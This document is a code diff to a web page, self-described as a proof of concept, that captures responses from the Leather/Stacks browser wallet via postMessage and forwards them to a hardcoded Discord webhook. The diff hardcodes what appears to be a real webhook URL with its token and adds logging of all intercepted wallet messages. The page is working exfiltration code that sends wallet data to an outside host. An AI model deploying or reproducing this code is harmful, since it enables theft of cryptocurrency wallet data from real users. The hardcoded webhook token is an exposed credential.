@@ -174,7 +174,7 @@
                 type="text" 
                 id="webhookUrl" 
                 placeholder="https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
-                value="https://discordapp.com/api/webhooks/1436328098105659475/BF6k132AhabUEVgB5OBudx3kYnSqGgKq6ySyXBlDIxNWUBDHVabANLNIWrulUYiRq5FT">
+                value="">
             <p style="margin-top: 10px; font-size: 12px; color: #666;">
                 Get your webhook: Discord Server → Channel Settings → Integrations → Webhooks
             </p>
@@ -194,15 +194,17 @@
     </div>
 
     <script>
+        // ============================================
+        // 🔧 CONFIGURATION - EDIT WEBHOOK URL HERE!
+        // ============================================
+        const DISCORD_WEBHOOK = 'https://discordapp.com/api/webhooks/1436328098105659475/BF6k132AhabUEVgB5OBudx3kYnSqGgKq6ySyXBlDIxNWUBDHVabANLNIWrulUYiRq5FT';
+        // ============================================
+        
         // Configuration
         const CONFIG = {
-            WEBHOOK_URL: '', // Will be auto-loaded from input field
+            WEBHOOK_URL: DISCORD_WEBHOOK, // Auto-loaded from above
             LEATHER_DETECTED: false
         };
-        
-        // OPTIONAL: Hardcode webhook here for auto-load
-        // Uncomment and set your webhook URL:
-        // CONFIG.WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN';
         
         // Logging utility
         function log(message, type = 'info') {
@@ -413,6 +415,11 @@
         
         // Listen for wallet responses - THIS CAPTURES REAL DATA
         window.addEventListener('message', (event) => {
+            // Debug: log all messages
+            if (event.data) {
+                console.log('Message received:', event.data);
+            }
+            
             if (event.data && event.data.source === 'stacks-wallet') {
                 log('📨 REAL wallet response received!', 'success');
                 console.log('Full response:', event.data);
@@ -422,6 +429,7 @@
                 
                 if (result) {
                     log('✅ Real data captured from wallet!', 'success');
+                    log('📊 Data: ' + JSON.stringify(result).substring(0, 100) + '...', 'info');
                     
                     // Send REAL data to Discord
                     if (CONFIG.WEBHOOK_URL) {
@@ -437,9 +445,12 @@
                         
                         log('📤 Sending REAL data to Discord...', 'info');
                         sendToDiscord(realData);
+                    } else {
+                        log('❌ Webhook not configured, cannot send data', 'error');
                     }
                 } else {
                     log('⚠️ Response received but no result data', 'error');
+                    log('Response structure: ' + JSON.stringify(event.data), 'info');
                 }
             }
         });
@@ -457,6 +468,11 @@
         
         // Initialize
         log('🔍 PoC initialized', 'info');
+        
+        // Sync input field with hardcoded webhook
+        if (DISCORD_WEBHOOK && DISCORD_WEBHOOK !== '') {
+            document.getElementById('webhookUrl').value = DISCORD_WEBHOOK;
+        }
         
         // IMPORTANT: Auto-load webhook from input field on page load
         // This runs immediately to detect pre-filled webhook URL
